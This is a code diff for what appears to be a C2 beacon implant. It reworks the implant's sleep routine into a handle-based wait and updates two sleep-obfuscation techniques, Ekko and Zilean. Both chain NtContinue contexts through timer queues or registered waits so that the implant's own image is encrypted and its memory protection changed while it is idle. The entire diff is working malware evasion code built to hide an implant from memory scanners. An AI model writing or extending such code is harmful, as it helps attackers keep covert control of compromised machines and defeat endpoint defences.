@@ -52,27 +52,23 @@ DWORD SleepCalculateWithJitter(const Profile* profile)
     return sleep_ms > 0 ? (DWORD)sleep_ms : 0;
 }
 
-static VOID BeaconWaitableSleep(BeaconContext* ctx, DWORD sleep_ms)
+static DWORD BeaconWaitPlain(BeaconContext* ctx, const HANDLE* handles,
+                             DWORD count, DWORD timeout_ms)
 {
-    HANDLE wake_event;
-
-    if (!ctx || sleep_ms == 0) return;
-
-    wake_event = ctx->runtime.wake_event;
-    if (wake_event) {
-        if (ctx->api.pfnWaitForSingleObject) {
-            ctx->api.pfnWaitForSingleObject(wake_event, sleep_ms);
-        } else {
-            WaitForSingleObject(wake_event, sleep_ms);
-        }
-        return;
+    if (handles && count > 0) {
+        return WaitForMultipleObjects(count, handles, FALSE, timeout_ms);
     }
 
-    if (ctx->api.pfnSleep) {
-        ctx->api.pfnSleep(sleep_ms);
+    if (timeout_ms == 0) {
+        return WAIT_TIMEOUT;
+    }
+
+    if (ctx && ctx->api.pfnSleep) {
+        ctx->api.pfnSleep(timeout_ms);
     } else {
-        Sleep(sleep_ms);
+        Sleep(timeout_ms);
     }
+    return WAIT_TIMEOUT;
 }
 
 /* sleep 混淆定时器链本身需要消耗的估算时间 */
@@ -159,8 +155,8 @@ static VOID SleepObfPrepareContext(CONTEXT* dst, const CONTEXT* base, PVOID rip,
     dst->R9 = (DWORD64)r9;
 }
 
-/* 执行 Ekko sleep：加密映像、等待、解密并恢复 .text 保护 */
-static BOOL EkkoSleep(BeaconContext* ctx, DWORD sleep_ms)
+/* 执行 Ekko wait：加密映像、等待事件/超时、解密并恢复 .text 保护 */
+static BOOL EkkoWait(BeaconContext* ctx, const HANDLE* handles, DWORD count, DWORD wait_ms)
 {
     SleepObfImageRegions regions;
     BYTE key_bytes[16];
@@ -175,7 +171,6 @@ static BOOL EkkoSleep(BeaconContext* ctx, DWORD sleep_ms)
     HANDLE timer_event = NULL;
     HANDLE start_event = NULL;
     HANDLE done_event = NULL;
-    HANDLE wait_handle = NULL;
     DWORD old_protect = 0;
     DWORD tmp_protect = 0;
     DWORD masked_wait_ms;
@@ -184,7 +179,8 @@ static BOOL EkkoSleep(BeaconContext* ctx, DWORD sleep_ms)
     BOOL ok = FALSE;
     UINT i;
 
-    if (!EkkoHasApi(ctx) || sleep_ms <= overhead + SLEEP_OBF_MIN_MASK_MS) {
+    if (!EkkoHasApi(ctx) || !handles || count == 0 ||
+        wait_ms <= overhead + SLEEP_OBF_MIN_MASK_MS) {
         return FALSE;
     }
     if (!SleepObfFindImageRegions(ctx, &regions)) {
@@ -209,11 +205,6 @@ static BOOL EkkoSleep(BeaconContext* ctx, DWORD sleep_ms)
         ctx->api.pfnRtlCreateTimerQueue(&queue) < 0 || !queue) {
         goto cleanup;
     }
-    wait_handle = ctx->api.pfnOpenProcess(SYNCHRONIZE, FALSE, ctx->api.pfnGetCurrentProcessId());
-    if (!wait_handle) {
-        goto cleanup;
-    }
-
     ZeroMemory(&timer_ctx, sizeof(timer_ctx));
     timer_ctx.ContextFlags = CONTEXT_FULL;
 
@@ -234,7 +225,7 @@ static BOOL EkkoSleep(BeaconContext* ctx, DWORD sleep_ms)
     if (ctx->api.pfnWaitForSingleObject(timer_event, 2000) != WAIT_OBJECT_0) {
         goto cleanup;
     }
-    masked_wait_ms = sleep_ms + delay;
+    masked_wait_ms = wait_ms + delay;
 
     /* 定时器链阶段：等待启动 → 改写保护 → 加密 → 休眠 → 解密 → 恢复保护 → 通知完成 */
     SleepObfPrepareContext(&ctxs[0], &timer_ctx,
@@ -247,8 +238,8 @@ static BOOL EkkoSleep(BeaconContext* ctx, DWORD sleep_ms)
                        ctx->api.pfnSystemFunction032,
                        (ULONG_PTR)&data, (ULONG_PTR)&key, 0, 0);
     SleepObfPrepareContext(&ctxs[3], &timer_ctx,
-                       ctx->api.pfnWaitForSingleObject,
-                       (ULONG_PTR)wait_handle, masked_wait_ms, 0, 0);
+                       WaitForMultipleObjects,
+                       count, (ULONG_PTR)handles, FALSE, masked_wait_ms);
     SleepObfPrepareContext(&ctxs[4], &timer_ctx,
                        ctx->api.pfnSystemFunction032,
                        (ULONG_PTR)&data, (ULONG_PTR)&key, 0, 0);
@@ -270,7 +261,7 @@ static BOOL EkkoSleep(BeaconContext* ctx, DWORD sleep_ms)
     }
 
     ctx->api.pfnSetEvent(start_event);
-    ok = ctx->api.pfnWaitForSingleObject(done_event, sleep_ms + overhead + 5000) == WAIT_OBJECT_0;
+    ok = ctx->api.pfnWaitForSingleObject(done_event, wait_ms + overhead + 5000) == WAIT_OBJECT_0;
 
 cleanup:
     if (queue) {
@@ -282,7 +273,6 @@ cleanup:
     if (start_event) CloseHandle(start_event);
     if (timer_event) CloseHandle(timer_event);
     if (done_event) CloseHandle(done_event);
-    if (wait_handle) ctx->api.pfnCloseHandle(wait_handle);
     SecureZeroMemory(key_bytes, sizeof(key_bytes));
     SecureZeroMemory(&key, sizeof(key));
     SecureZeroMemory(&data, sizeof(data));
@@ -307,8 +297,8 @@ static BOOL ZileanHasApi(BeaconContext* ctx)
            ctx->api.pfnSystemFunction032;
 }
 
-/* 执行 Zilean sleep：通过 RtlRegisterWait 调度 NtContinue 上下文链 */
-static BOOL ZileanSleep(BeaconContext* ctx, DWORD sleep_ms)
+/* 执行 Zilean wait：通过 RtlRegisterWait 调度 NtContinue 上下文链 */
+static BOOL ZileanWait(BeaconContext* ctx, const HANDLE* handles, DWORD count, DWORD wait_ms)
 {
     SleepObfImageRegions regions;
     BYTE key_bytes[16];
@@ -321,7 +311,6 @@ static BOOL ZileanSleep(BeaconContext* ctx, DWORD sleep_ms)
     HANDLE timer_event = NULL;
     HANDLE start_event = NULL;
     HANDLE done_event = NULL;
-    HANDLE wait_handle = NULL;
     DWORD old_protect = 0;
     DWORD tmp_protect = 0;
     DWORD overhead = SleepObfEstimatedOverhead();
@@ -329,7 +318,8 @@ static BOOL ZileanSleep(BeaconContext* ctx, DWORD sleep_ms)
     BOOL ok = FALSE;
     UINT i;
 
-    if (!ZileanHasApi(ctx) || sleep_ms <= overhead + SLEEP_OBF_MIN_MASK_MS) {
+    if (!ZileanHasApi(ctx) || !handles || count == 0 ||
+        wait_ms <= overhead + SLEEP_OBF_MIN_MASK_MS) {
         return FALSE;
     }
     if (!SleepObfFindImageRegions(ctx, &regions)) {
@@ -353,11 +343,6 @@ static BOOL ZileanSleep(BeaconContext* ctx, DWORD sleep_ms)
     if (!wait_event || !start_event || !timer_event || !done_event) {
         goto cleanup;
     }
-    wait_handle = ctx->api.pfnOpenProcess(SYNCHRONIZE, FALSE, ctx->api.pfnGetCurrentProcessId());
-    if (!wait_handle) {
-        goto cleanup;
-    }
-
     ZeroMemory(&wait_ctx, sizeof(wait_ctx));
     wait_ctx.ContextFlags = CONTEXT_FULL;
 
@@ -392,8 +377,8 @@ static BOOL ZileanSleep(BeaconContext* ctx, DWORD sleep_ms)
                            ctx->api.pfnSystemFunction032,
                            (ULONG_PTR)&data, (ULONG_PTR)&key, 0, 0);
     SleepObfPrepareContext(&ctxs[3], &wait_ctx,
-                           ctx->api.pfnWaitForSingleObject,
-                           (ULONG_PTR)wait_handle, sleep_ms, 0, 0);
+                           WaitForMultipleObjects,
+                           count, (ULONG_PTR)handles, FALSE, wait_ms);
     SleepObfPrepareContext(&ctxs[4], &wait_ctx,
                            ctx->api.pfnSystemFunction032,
                            (ULONG_PTR)&data, (ULONG_PTR)&key, 0, 0);
@@ -406,7 +391,7 @@ static BOOL ZileanSleep(BeaconContext* ctx, DWORD sleep_ms)
 
     for (i = 0; i < SLEEP_OBF_TIMER_STAGE_COUNT; ++i) {
         if (i == 4) {
-            delay += sleep_ms + SLEEP_OBF_TIMER_STEP_MS;
+            delay += wait_ms + SLEEP_OBF_TIMER_STEP_MS;
         } else {
             delay += SLEEP_OBF_TIMER_STEP_MS;
         }
@@ -421,7 +406,7 @@ static BOOL ZileanSleep(BeaconContext* ctx, DWORD sleep_ms)
     }
 
     ctx->api.pfnSetEvent(start_event);
-    ok = ctx->api.pfnWaitForSingleObject(done_event, sleep_ms + overhead + 5000) == WAIT_OBJECT_0;
+    ok = ctx->api.pfnWaitForSingleObject(done_event, wait_ms + overhead + 5000) == WAIT_OBJECT_0;
 
 cleanup:
     if (!ok && start_event) {
@@ -436,7 +421,6 @@ cleanup:
     if (start_event) CloseHandle(start_event);
     if (timer_event) CloseHandle(timer_event);
     if (done_event) CloseHandle(done_event);
-    if (wait_handle) ctx->api.pfnCloseHandle(wait_handle);
     SecureZeroMemory(key_bytes, sizeof(key_bytes));
     SecureZeroMemory(&key, sizeof(key));
     SecureZeroMemory(&data, sizeof(data));
@@ -444,45 +428,47 @@ cleanup:
 }
 #endif
 
-/* Beacon 主循环调用的休眠入口，按配置选择普通 Sleep 或 sleep 混淆技术 */
-VOID BeaconSleep(BeaconContext* ctx)
+DWORD BeaconWait(BeaconContext* ctx, const HANDLE* handles, DWORD count, DWORD timeout_ms)
 {
-    DWORD sleep_ms;
-
-    if (!ctx) return;
-
-    sleep_ms = SleepCalculateWithJitter(&ctx->profile);
-    if (sleep_ms == 0) return;
-
-#ifndef _WIN64
-    BeaconWaitableSleep(ctx, sleep_ms);
-    return;
-#else
+    HANDLE local_handles[MAXIMUM_WAIT_OBJECTS];
+#ifdef _WIN64
     ULONGLONG start;
     ULONGLONG elapsed;
     BOOL ok = FALSE;
+#endif
+
+    if (!handles || count == 0 || count > MAXIMUM_WAIT_OBJECTS ||
+        timeout_ms == 0 || timeout_ms == INFINITE) {
+        return BeaconWaitPlain(ctx, handles, count, timeout_ms);
+    }
+    CopyMemory(local_handles, handles, sizeof(HANDLE) * count);
+
+#ifndef _WIN64
+    return BeaconWaitPlain(ctx, local_handles, count, timeout_ms);
+#else
+    if (!ctx) {
+        return BeaconWaitPlain(ctx, local_handles, count, timeout_ms);
+    }
 
     if (!ctx->profile.sleep_obf_enabled ||
         (ctx->profile.sleep_obf_technique != SLEEP_OBF_EKKO &&
          ctx->profile.sleep_obf_technique != SLEEP_OBF_ZILEAN) ||
-        sleep_ms < SLEEP_OBF_MIN_MS ||
-        sleep_ms <= SleepObfEstimatedOverhead() + SLEEP_OBF_MIN_MASK_MS) {
-        BeaconWaitableSleep(ctx, sleep_ms);
-        return;
+        timeout_ms < SLEEP_OBF_MIN_MS ||
+        timeout_ms <= SleepObfEstimatedOverhead() + SLEEP_OBF_MIN_MASK_MS) {
+        return BeaconWaitPlain(ctx, local_handles, count, timeout_ms);
     }
 
     if (!RuntimeSleepObfBegin(ctx)) {
-        BeaconWaitableSleep(ctx, sleep_ms);
-        return;
+        return BeaconWaitPlain(ctx, local_handles, count, timeout_ms);
     }
 
     start = ctx->api.pfnGetTickCount64 ? ctx->api.pfnGetTickCount64() : GetTickCount64();
     switch (ctx->profile.sleep_obf_technique) {
     case SLEEP_OBF_EKKO:
-        ok = EkkoSleep(ctx, sleep_ms);
+        ok = EkkoWait(ctx, local_handles, count, timeout_ms);
         break;
     case SLEEP_OBF_ZILEAN:
-        ok = ZileanSleep(ctx, sleep_ms);
+        ok = ZileanWait(ctx, local_handles, count, timeout_ms);
         break;
     default:
         ok = FALSE;
@@ -492,11 +478,31 @@ VOID BeaconSleep(BeaconContext* ctx)
     if (!ok) {
         RuntimeSleepObfEnd(ctx);
         elapsed = (ctx->api.pfnGetTickCount64 ? ctx->api.pfnGetTickCount64() : GetTickCount64()) - start;
-        if (elapsed < sleep_ms) {
-            BeaconWaitableSleep(ctx, (DWORD)(sleep_ms - elapsed));
+        if (elapsed < timeout_ms) {
+            return BeaconWaitPlain(ctx, local_handles, count, (DWORD)(timeout_ms - elapsed));
         }
-        return;
+        return BeaconWaitPlain(ctx, local_handles, count, 0);
     }
     RuntimeSleepObfEnd(ctx);
+    return BeaconWaitPlain(ctx, local_handles, count, 0);
 #endif
+}
+
+/* Beacon 主循环调用的休眠入口，按配置选择普通 Sleep 或 sleep 混淆技术 */
+VOID BeaconSleep(BeaconContext* ctx)
+{
+    HANDLE wake_event;
+    DWORD sleep_ms;
+
+    if (!ctx) return;
+
+    sleep_ms = SleepCalculateWithJitter(&ctx->profile);
+    if (sleep_ms == 0) return;
+
+    wake_event = ctx->runtime.wake_event;
+    if (wake_event) {
+        BeaconWait(ctx, &wake_event, 1, sleep_ms);
+    } else {
+        BeaconWaitPlain(ctx, NULL, 0, sleep_ms);
+    }
 }
